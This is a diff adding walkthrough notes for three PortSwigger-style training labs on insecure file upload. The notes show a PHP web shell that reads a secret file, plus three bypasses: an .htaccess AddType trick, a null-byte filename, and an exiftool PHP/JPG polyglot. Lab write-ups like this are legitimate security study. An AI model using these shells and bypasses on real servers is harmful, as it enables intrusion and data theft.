@@ -174,32 +174,68 @@ You can log in to your own account using the following credentials: wiener:peter
 - go back to your account page
 - find the `GET /files/avatars/..%2fexploit.php` and observe that carlos' secret was returned in the response
 
-### 
+### Web shell upload via extension blacklist bypass
 
+Background:
 
+```
+This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.
 
+To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
 
+You can log in to your own account using the following credentials: wiener:peter
+Hint: You need to upload two different files to solve this lab
+```
 
+- log in and upload an image as your avatar, then go back to the account page
+- in burp go to `proxy > http history` and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>` and send it to repeater
+- on your system create a file called exploit.php containing this: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
+- attempt to upload this script as your avatar, you get blocked because it is a `.php` file extension
+- in burp history look for the `POST /my-account/avatar` and send it to repeater
+- in repeater find the part of the body that relates to your PHP file, make the following changes
+  - Change the value of the `filename` parameter to `.htaccess`
+  - Change the value of the `Content-Type` header to `text/plain`
+  - Replace the contents of the file (your PHP payload) with the following Apache directive: `AddType application/x-httpd-php .l33t`
+- send the request and see that it was successful
+- use burp repeater to return to the original request for uploading you PHP exploit and change the value of the filename parameter from `exploit.php` to `exploit.l33t` send the request again and notice that it was successful
+- switch to the repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` change the path to ``exploit.l33t` and send it and get carlos' secret in the response
 
+### Web shell upload via obfuscated file extension
 
+Background:
 
+```
+This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.
 
+To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
 
+You can log in to your own account using the following credentials: wiener:peter 
+```
 
+- log in and upload an image as your avatar, then go back to the account page
+- in burp go to `proxy > http history` and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>` and send it to repeater
+- on your system create a file called exploit.php containing this: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
+- attempt to upload and see that it is blocked because it isn't a JPG or PNG file
+- in proxy history find the `POST /my-account/avatar` and send to repeater
+- in the above repeater tab change the `filename` parameter in the `Content-Disposition` header like so: `filename="exploit.php%00.jpg"`
+- send the request and observe that the file was successfully uploaded and the message referes to the file as `exploit.php` suggesting that the null byte and `.jpg` extension have been stripped
+- switch back to the `GET /files/avatars/<YOUR-IMAGE>` request and change the path to `exploit.php` and send to get carlos' secret
 
+### Remote code execution via polyglot web shell upload
 
+Background:
 
+```
+This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.
 
+To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
 
+You can log in to your own account using the following credentials: wiener:peter 
+```
 
-
-
-
-
-
-
-
-
-
-
+- on your system create a file called exploit.php containing this: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
+- log in and attempt to upload the script as your avatar, observe that this gets blocked
+- create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata using the exiftool: `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`
+- in your browser attempt to upload this polyglot file as your avatar, and go back to your account page
+- in burps history find the `GET /files/avatars/polyglot.php` and use the message editor's search feature to find the `START` string somewhere within the binary image data in the response, between the `END` string you should see carlos' secret like so: `START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END`
 
